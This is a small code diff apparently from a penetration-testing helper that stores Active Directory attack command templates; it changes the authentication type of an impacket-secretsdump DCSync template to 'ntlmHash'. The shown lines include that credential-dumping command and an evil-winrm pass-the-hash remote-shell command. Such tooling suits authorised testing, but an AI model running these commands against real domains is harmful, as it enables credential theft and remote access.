@@ -71,7 +71,7 @@ const domainCommands: Command[] = [
   {
     template:
       "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
-    authType: "password",
+    authType: "ntlmHash",
   },
   {
     template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
